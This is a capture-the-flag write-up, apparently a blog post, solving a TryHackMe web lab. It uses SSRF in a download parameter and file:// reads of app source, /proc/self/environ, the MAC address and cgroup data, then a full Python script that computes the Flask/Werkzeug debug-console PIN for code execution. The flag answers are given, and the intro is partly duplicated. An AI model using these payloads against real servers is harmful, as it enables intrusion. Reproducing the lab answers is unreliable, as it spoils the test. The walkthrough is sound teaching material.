### **THM Plant Photographer**

![](https://cdn-images-1.medium.com/max/1000/1*v_7aPmsLCCEvG1VuLhjqKA.png)

  

Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos:

[http://MACHINE_IP/](http://MACHINE_IP/)

Proud of building the site himself from scratch, he’s asked you to take a quick look and let him know if anything could be improved. Look closely at how the site wPasted image 20260331175353.png  
 Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos:

nmap at first

![](https://cdn-images-1.medium.com/max/1000/1*8DxmxWJau03H8q7SlYC1OQ.png)

dirsearch

![](https://cdn-images-1.medium.com/max/1000/1*WBtFSM8xeTAk00FkGi5S7A.png)

found an email

![](https://cdn-images-1.medium.com/max/1000/1*aVb-69yTc2pEOum-555Wdw.png)

![](https://cdn-images-1.medium.com/max/1000/1*SmU-n-PMecWgUSqcCNwyRg.png)

so ,its clearly

X-Forwarded-For: 127.0.0.1??

right?

![](https://cdn-images-1.medium.com/max/1000/1*dZMSsyEzhbhGY5iV1W10qA.png)

but unfortunately

so,try other way

download button

![](https://cdn-images-1.medium.com/max/1000/1*zZEXXMokSk5Kox3WJ53FrQ.png)

**SSRF** 

so, we make a request

[http://10.49.181.141/download?server=192.168.141.70:4446&id=75482342](http://10.49.181.141/download?server=192.168.141.70:4446&id=75482342)

![](https://cdn-images-1.medium.com/max/1000/1*HeXfDEtYw2t82SSi9TEPwQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*ExLNbMbuQUzaMV8_TwlMBA.png)

so, we got the first flag

**_Q1:What API key is used to retrieve files from the secure storage service?_**

**_A1:THM{Hello_Im_just_an_API_key}_**

than,we try ssrf to request admin

[http://10.49.181.141/download?server=127.0.0.1%3A80&id=admin](http://10.49.181.141/download?server=127.0.0.1%3A80&id=admin)

at this page ,we found the true request it make

crl.setopt(crl.URL, server + ‘/public-docs-k057230990384293/’ + filename)

![](https://cdn-images-1.medium.com/max/1000/1*t0IFxY3KSuQ15KP58zDtyw.png)

so ,we use

[http://10.49.181.141/download?server=127.0.0.1/admin?%23&id=1](http://10.49.181.141/download?server=127.0.0.1/admin?%23&Id=1)

to cut it

oh, no

![](https://cdn-images-1.medium.com/max/1000/1*rle3Iu9_OIgjpvyNlzi2Ug.png)

so we use the 8087 we found before

and download a pdf

![](https://cdn-images-1.medium.com/max/1000/1*DVdavGzE4ntMsgJ9qA92Vg.png)

yep

**_Q2:What is the flag in the admin section of the website?_**

**_A2:THM{c4n_i_haz_flagz_plz?}_**

we use try to found something

[http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&id=1](http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&id=1)

but what we download is a pdf,so use 

curl -s ‘[http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&id=1'](http://10.49.181.141/download?server=file:///usr/src/app/app.py%23&id=1%27) -o-

![](https://cdn-images-1.medium.com/max/1000/1*R7AUVFqbxzUuVj-t4GYH7g.png)

we found a very important detail

if __name__ == “__main__”:  
 app.run(host=’0.0.0.0', port=8087, debug=True)

so we can found /console

![](https://cdn-images-1.medium.com/max/1000/1*lzBNG7d4Sp1mGxa05OgfIg.png)

and more important pin could be found

  
Flask 的 debug PIN 不是随机的，是用服务器固定信息算出来的，这台机器我们已经能读文件，所以直接算就能出 PIN！  
需要 4 个关键信息（这题里全都能拿到）：  
username 用户名  
modname 模块名（固定 flask.app）  
appid 应用 ID（固定 Flask）  
绝对路径：/usr/src/app/app.py  
机器码 /etc/machine-id（这题能读）  
网卡地址 /sys/class/net/eth0/address（这题能读）

so use

curl -s ‘[http://10.49.181.141/download?server=file:///proc/self/environ%23&id=1'](http://10.49.181.141/download?server=file:///proc/self/environ%23&id=1%27) -o-

![](https://cdn-images-1.medium.com/max/1000/1*qyDtGT2Yj5uQhW6aTIjR3A.png)

so,username is root 

and we found

‘/usr/local/lib/python3.10/site-packages/flask/app.py’

at error page before

![](https://cdn-images-1.medium.com/max/1000/1*FxPsvaDvWakDR1FWCOhzUQ.png)

curl -s ‘[http://10.49.181.141/download?server=file:///sys/class/net/eth0/address%23&id=1'](http://10.49.181.141/download?server=file:///sys/class/net/eth0/address%23&id=1%27) -o-

![](https://cdn-images-1.medium.com/max/1000/1*ImuEnBNR7Vypb_3eRGY1tQ.png)

translate

![](https://cdn-images-1.medium.com/max/1000/1*1UArTCde5gGY6OHRvCgtEg.png)

  

2485378088962

at last the machine id

we cant found it ,with some check,we found a right way to fullfill

**Werkzeug was**`**0.16.0**`

![](https://cdn-images-1.medium.com/max/1000/1*-UGWrEGK6m4ivSbv-aF-VQ.png)

so, we 

curl -s ‘http://10.49.181.141/download?server=file:///proc/self/cgroup%23&id=1' -o-

to found it

![](https://cdn-images-1.medium.com/max/1000/1*qKXdaai-Z-cYgHDVwhubyQ.png)

77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca

here is what we use
————————————————————————————————
import hashlib
from itertools import chain

probably_public_bits = [
    'root',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '2485378088962',
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'
]

h = hashlib.md5()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
————————————————————————————————


![](https://cdn-images-1.medium.com/max/1000/1*K1EOkF6zA2f5im-LL9jqXA.png)

so try this

![](https://cdn-images-1.medium.com/max/1000/1*qwwnlKAmzgGMwoUUF3IMsg.png)

wow

![](https://cdn-images-1.medium.com/max/1000/1*ydgUb34mj0O8_IDbXphHaA.png)

we found the third flag

**_Q3:What flag is stored in a text file in the server’s web directory?_**

**_A3:THM{SSRF2RCE_2_1337_4_M3}_**